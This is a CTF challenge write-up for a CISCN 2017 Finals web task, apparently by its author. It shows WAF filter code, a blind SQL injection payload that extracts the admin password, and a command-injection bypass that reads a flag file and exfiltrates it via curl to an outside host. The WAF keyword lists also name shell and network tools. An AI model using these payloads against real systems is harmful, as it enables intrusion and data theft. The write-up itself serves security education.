# Ciscn2017Finals

## Web500 留言板

---

### First

There is a AES-128-CBC encode id for `/messageDetail.php?id=XXX`

It can do **Oracle padding attack**, but I can't 

But, it's hard to succeed~

>[Pwnhub-粗心的佳佳-writeup --L3m0n](http://www.cnblogs.com/iamstudy/articles/pwnhub_jiajia_writeup.html)

Because the challenge used in Pwnhub, I'd make it more difficult!

I set dynamic secret key `define("SECRET_KEY", "Ginkgo".substr((string)time(),0,7)."666");` and **blind-injection** for it.

The waf is:

    function waf($value){
        $filter = "union|and|updatexml|where|like|left| |,|\x09|\x0a|\x0d|\x0b|\x0c|\xa0|--|\*|\\|or|right|regexp|benchmark|join|sleep|where|=|<|>|sub";
        if (preg_match("/".$filter."/is",$value)==1){   
            print "Waf by HumenSec";
            exit();
        }
    }

Playload:

    -3||ascii(mid((select(admin_pass)from(admin))from(%s)for(1)))=%s

PS:

[VAuditDemo](https://github.com/virink/VAuditDemo) is an open source program, it can find on Github.

And I have not changed database's structure.

### Maybe first too

There is also AES-128-CBC encode for admin's login verification, it's like NJCTF 2017 web300 Be Admin

[NJCTF-2017-web-Writeup](http://www.bendawang.site/article/NJCTF-2017-web-Writeup)

### Also first

Maybe it is too hard to bypass, I made a weak password for admin `admin1024`

### Second

There is a Process monitoring in admin's panel.

It's Command injection!!!

A sick waf~~

    function hwaf($value){
        $filter = "<|>|php|0x|\\|python|gcc|less|root|etc|pass|http|ftp|cd|bash|[\w\d]+\.[\w\d]+|tcp|udp|cat|×|fl|ag|flag|ph|hp|wget";
        if (preg_match("/".$filter."/is",$value)==1){  
            exit('Waf by HumenSec');
        }
    }

Playload:

    c=xxx;a=ca;b=t;c=f;d=g;h=1;e=.;f=h;g=p;h=la;i=humen666;k=2333;curl${IFS}2886800124:8000/?r=`$a$b${IFS}$i$c$h$d$k$e$g$f$g`

---

## How about this challenge?
